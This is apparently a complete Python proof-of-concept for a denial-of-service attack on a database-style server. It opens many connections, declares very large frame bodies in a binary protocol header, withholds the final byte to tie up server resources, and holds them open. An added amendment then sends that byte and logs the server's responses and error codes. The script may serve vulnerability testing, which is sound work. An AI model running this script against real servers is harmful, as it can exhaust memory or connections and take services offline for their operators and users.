import socket, struct, sys, time
host, port, K, L, hold = sys.argv[1], int(sys.argv[2]), int(sys.argv[3]), int(sys.argv[4]), int(sys.argv[5])
socks = []
for i in range(K):
    s = socket.create_connection((host, port))
    s.sendall(struct.pack('>BBhBI', 0x04, 0, 1, 0x05, L))  # v4 request, stream 1, OPTIONS, body length L
    sent, chunk = 0, b'\0' * 65536
    while sent < L - 1:
        n = min(65536, L - 1 - sent); s.sendall(chunk[:n]); sent += n
    socks.append(s)
print("holding", len(socks), flush=True); time.sleep(hold)
# --- stage-4 amendment C3 (2026-10-27): send the withheld final byte and read one response per socket, then close ---
def recvn(s, n):
    b = b''
    while len(b) < n:
        c = s.recv(n - len(b))
        if not c:
            raise EOFError('closed after %d of %d bytes' % (len(b), n))
        b += c
    return b
for s in socks:
    s.sendall(b'\0')
for i, s in enumerate(socks):
    try:
        s.settimeout(10)
        ver, flags, stream, op, n = struct.unpack('>BBhBI', recvn(s, 9))
        body = recvn(s, n)
        extra = ''
        if op == 0:
            code, mlen = struct.unpack('>iH', body[:6])
            extra = ' code=0x%04x msg=%s' % (code, body[6:6 + mlen].decode('utf-8', 'replace'))
        print('resp i=%d ver=0x%02x stream=%d opcode=%d len=%d%s' % (i, ver, stream, op, n, extra), flush=True)
    except Exception as e:
        print('resp i=%d error=%r' % (i, e), flush=True)
for s in socks: s.close()
print("closed", len(socks), flush=True)
